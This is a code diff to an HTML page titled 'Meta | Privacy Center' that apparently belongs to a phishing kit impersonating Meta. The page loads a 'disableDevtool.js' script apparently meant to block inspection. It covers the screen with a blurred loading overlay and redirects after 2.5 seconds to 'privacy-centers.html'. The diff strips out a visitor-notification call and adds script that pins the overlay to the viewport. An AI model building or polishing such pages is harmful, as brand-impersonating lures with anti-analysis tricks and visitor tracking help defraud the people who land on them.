@@ -3,16 +3,61 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <title>Meta | Privacy Center</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@3.4.1/dist/tailwind.min.css">
     <link rel="stylesheet" href="./public/styles/checkbox.css">
     <link rel="stylesheet" href="./public/styles/style.css">
     <style>
-        #page-boot-overlay{position:fixed;inset:0;z-index:2147483646;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,.82);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px)}
+        #page-boot-overlay{position:fixed!important;top:0;right:0;bottom:0;left:0;width:100%;height:100%;min-height:100vh;min-height:100dvh;z-index:2147483646;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,.82);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px)}
         .boot-spinner{width:36px;height:36px;border:3px solid #e0e0e0;border-top-color:#1877f2;border-radius:50%;animation:_tl_spin .7s linear infinite}
         @keyframes _tl_spin{to{transform:rotate(360deg)}}
     </style>
+    <script>
+        (function () {
+            var pinned = [];
+            function size(el) {
+                if (!el || !el.isConnected) return;
+                var vv = window.visualViewport;
+                var top = (vv && vv.offsetTop) || 0;
+                var left = (vv && vv.offsetLeft) || 0;
+                var width = vv ? vv.width : window.innerWidth;
+                var height = Math.max(
+                    (vv && vv.height) || 0,
+                    window.innerHeight || 0,
+                    document.documentElement.clientHeight || 0
+                );
+                el.style.setProperty('position', 'fixed', 'important');
+                el.style.setProperty('top', top + 'px', 'important');
+                el.style.setProperty('left', left + 'px', 'important');
+                el.style.setProperty('right', 'auto', 'important');
+                el.style.setProperty('bottom', 'auto', 'important');
+                el.style.setProperty('width', width + 'px', 'important');
+                el.style.setProperty('height', height + 'px', 'important');
+            }
+            function sync() {
+                pinned = pinned.filter(function (el) { return el && el.isConnected; });
+                pinned.forEach(size);
+            }
+            window.__pinViewportOverlay = function (el) {
+                if (!el) return;
+                if (el.parentNode !== document.documentElement) {
+                    document.documentElement.appendChild(el);
+                }
+                if (pinned.indexOf(el) === -1) pinned.push(el);
+                size(el);
+            };
+            window.__unpinViewportOverlay = function (el) {
+                pinned = pinned.filter(function (x) { return x !== el; });
+            };
+            window.addEventListener('resize', sync);
+            window.addEventListener('orientationchange', sync);
+            if (window.visualViewport) {
+                window.visualViewport.addEventListener('resize', sync);
+                window.visualViewport.addEventListener('scroll', sync);
+            }
+        })();
+    </script>
     <link rel="icon" href="./public/favicon-32x32.png">
 
     <!-- Tailwind CSS CDN -->
@@ -38,6 +83,10 @@
     <div id="page-boot-overlay">
         <div class="boot-spinner"></div>
     </div>
+    <script>
+        document.documentElement.classList.add('is-booting');
+        window.__pinViewportOverlay && window.__pinViewportOverlay(document.getElementById('page-boot-overlay'));
+    </script>
     <!-- NAVBAR START -->
     <div class="bg-white min-h-[100vh] w-full rounded-[0px]">
         <div
@@ -319,19 +368,11 @@
         <!-- Loading overlay is #page-boot-overlay -->
 
         <script src="./public/js/disableDevtool.js"></script>
-        <script src="./public/js/config.js"></script>
-        <script src="./public/js/utils.js"></script>
         <script>
-            document.addEventListener('DOMContentLoaded', async function () {
-                const started = Date.now();
-                try {
-                    await Utils.sendVisitNotification();
-                } catch (e) { /* continue */ }
-
-                const wait = Math.max(0, 2500 - (Date.now() - started));
+            document.addEventListener('DOMContentLoaded', function () {
                 setTimeout(function () {
                     window.location.href = 'privacy-centers.html';
-                }, wait);
+                }, 2500);
             });
         </script>
         <style>
